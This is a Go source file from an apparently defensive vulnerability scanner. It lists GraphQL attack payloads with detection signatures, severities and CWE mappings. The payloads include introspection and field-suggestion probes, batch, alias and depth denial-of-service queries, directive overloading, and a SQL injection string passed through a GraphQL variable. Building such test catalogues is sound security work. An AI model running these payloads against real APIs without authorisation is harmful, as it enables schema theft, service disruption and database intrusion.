package payloads

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// GraphQL Injection Payloads â€” Sourced from PayloadsAllTheThings/GraphQL Injection
// Covers: Introspection, Batch Query, Depth Attack, Field Suggestion,
//         Directive Abuse, SQLi in GraphQL, Mutation Abuse
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func GraphQLPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatGraphQL,
		Description: "GraphQL Injection â€” PayloadsAllTheThings + CWE-200",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection",
		Payloads:    graphqlAll(),
	}
}

func graphqlAll() []Payload {
	return []Payload{
		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Introspection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "graphql-introspection-full", Category: CatGraphQL,
			Technique: TechIntrospection,
			Name: "Full Introspection Query", Value: `{"query":"query{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}"}`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxGraphQL},
			Detection: DetectReflection, DetectSignature: `(?i)(__schema|queryType|mutationType|"kind")`,
			Severity: SevMedium, SafeMode: true, CVSSScore: 5.3,
			CWE: "CWE-200", OWASPCategory: "A01:2021",
			Description: "Full GraphQL introspection query â€” reveals entire API schema",
			Reference: "PayloadsAllTheThings", Tags: []string{"introspection"}, Enabled: true,
		},
		{
			ID: "graphql-introspection-typename", Category: CatGraphQL,
			Technique: TechIntrospection,
			Name: "Basic __typename Probe", Value: `{"query":"query{__typename}"}`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxGraphQL},
			Detection: DetectReflection, DetectSignature: `__typename`,
			Severity: SevInfo, SafeMode: true, CVSSScore: 3.1,
			CWE: "CWE-200", OWASPCategory: "A01:2021",
			Description: "Minimal GraphQL probe â€” confirms GraphQL endpoint exists",
			Reference: "PayloadsAllTheThings", Tags: []string{"introspection", "probe"}, Enabled: true,
		},
		{
			ID: "graphql-introspection-get", Category: CatGraphQL,
			Technique: TechIntrospection,
			Name: "GET-Based Introspection", Value: `query={__schema{types{name}}}`,
			Contexts:  []InjectionContext{CtxURLQuery},
			Detection: DetectReflection, DetectSignature: `(?i)(__schema|"name")`,
			Severity: SevMedium, SafeMode: true, CVSSScore: 5.3,
			CWE: "CWE-200", OWASPCategory: "A01:2021",
			Description: "GET-based introspection â€” bypasses POST-only introspection blocks",
			Reference: "PayloadsAllTheThings", Tags: []string{"introspection", "get_bypass"}, Enabled: true,
		},

		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Field Suggestion â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "graphql-field-suggestion", Category: CatGraphQL,
			Technique: TechFieldSuggestion,
			Name: "Field Suggestion Extraction", Value: `{"query":"query{vyomite_nonexistent_field}"}`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxGraphQL},
			Detection: DetectReflection, DetectSignature: `(?i)(Did you mean|Cannot query field|suggestions)`,
			Severity: SevLow, SafeMode: true, CVSSScore: 3.1,
			CWE: "CWE-200", OWASPCategory: "A01:2021",
			Description: "Invalid field triggers suggestions â€” leaks valid field names when introspection is disabled",
			Reference: "PayloadsAllTheThings", Tags: []string{"field_suggestion"}, Enabled: true,
		},

		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Batch Query / Alias DoS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "graphql-batch-query", Category: CatGraphQL,
			Technique: TechBatchQuery,
			Name: "Batch Query Probe", Value: `[{"query":"query{__typename}"},{"query":"query{__typename}"},{"query":"query{__typename}"},{"query":"query{__typename}"},{"query":"query{__typename}"}]`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxGraphQL},
			Detection: DetectReflection, DetectSignature: `__typename`,
			Severity: SevMedium, SafeMode: true, CVSSScore: 5.3,
			CWE: "CWE-770", OWASPCategory: "A05:2021",
			Description: "Batch query support detection â€” can be abused for brute force and DoS",
			Reference: "PayloadsAllTheThings", Tags: []string{"batch_query"}, Enabled: true,
		},
		{
			ID: "graphql-alias-overloading", Category: CatGraphQL,
			Technique: TechBatchQuery,
			Name: "Alias-Based Overloading", Value: `{"query":"query{a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename}"}`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxGraphQL},
			Detection: DetectReflection, DetectSignature: `(?i)(a1|a10|__typename)`,
			Severity: SevMedium, SafeMode: true, CVSSScore: 5.3,
			CWE: "CWE-770", OWASPCategory: "A05:2021",
			Description: "Alias-based query multiplication â€” bypasses batch query limits",
			Reference: "PayloadsAllTheThings", Tags: []string{"alias", "dos"}, Enabled: true,
		},

		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Depth Attack / Nested Query â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "graphql-depth-attack", Category: CatGraphQL,
			Technique: TechDepthAttack,
			Name: "Recursive Depth Query", Value: `{"query":"query{user{friends{friends{friends{friends{friends{name}}}}}}}"}`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxGraphQL},
			Detection: DetectTimeDelta, DelayMs: 3000,
			Severity: SevMedium, SafeMode: false, CVSSScore: 5.3,
			CWE: "CWE-400", OWASPCategory: "A05:2021",
			Description: "Deeply nested recursive query â€” tests for query depth limits",
			Reference: "PayloadsAllTheThings", Tags: []string{"depth_attack", "dos"}, Enabled: true,
		},

		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ SQLi in GraphQL Variables â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "graphql-sqli-variable", Category: CatGraphQL,
			Technique: TechProbe,
			Name: "SQLi via GraphQL Variable", Value: `{"query":"query($id:String!){user(id:$id){name}}","variables":{"id":"' OR 1=1-- -"}}`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxGraphQL},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(sql.syntax|unterminated|error.*query)`,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			CWE: "CWE-89", OWASPCategory: "A03:2021",
			Description: "SQL injection through GraphQL variables â€” backend may concatenate into SQL",
			Reference: "PayloadsAllTheThings", Tags: []string{"sqli", "variables"}, Enabled: true,
		},

		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Directive Abuse â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "graphql-directive-overloading", Category: CatGraphQL,
			Technique: TechDirectiveAbuse,
			Name: "Directive Overloading", Value: `{"query":"query{__typename @aa@bb@cc@dd@ee@ff@gg@hh@ii@jj}"}`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxGraphQL},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(Unknown directive|directive)`,
			Severity: SevLow, SafeMode: true, CVSSScore: 3.1,
			CWE: "CWE-400", OWASPCategory: "A05:2021",
			Description: "Directive overloading â€” tests for directive validation and limits",
			Reference: "PayloadsAllTheThings", Tags: []string{"directive"}, Enabled: true,
		},
	}
}
